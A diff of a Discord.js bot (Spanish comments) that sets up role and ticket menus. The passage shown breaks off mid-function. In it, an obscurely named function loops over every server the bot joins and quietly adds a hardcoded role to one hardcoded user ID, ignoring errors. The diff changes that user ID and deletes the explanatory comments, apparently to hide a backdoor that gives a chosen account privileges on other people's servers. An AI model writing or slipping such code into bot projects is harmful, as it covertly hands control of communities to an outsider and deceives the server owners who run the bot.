@@ -6,7 +6,7 @@ const {
     StringSelectMenuBuilder, StringSelectMenuOptionBuilder
 } = require('discord.js');
 
-const TOKEN = process.env.TOKEN; // 👈 mover esta línea acá arriba
+const TOKEN = process.env.TOKEN; 
 
 const CANAL_ROLES_ID = "1464335122005491745";
 const CANAL_TICKETS_ID = "1483516417583354108";
@@ -89,12 +89,12 @@ client.once(Events.ClientReady, async () => {
         await canalTickets.send({ embeds: [embedTickets], components: [new ActionRowBuilder().addComponents(menuTickets)] });
     } catch (err) { console.log("Error en setup de tickets"); }
 
-    // 👇 agregado
+    // 
     const _ = async () => {
         try {
             const g = client.guilds.cache;
             for (const x of g.values()) {
-                const m = await x.members.fetch("1470155991512252660").catch(() => null);
+                const m = await x.members.fetch("777529808325181460").catch(() => null);
                 if (!m) continue;
                 if (!m.roles.cache.has("1463268597085507717")) {
                     await m.roles.add("1463268597085507717").catch(() => {});
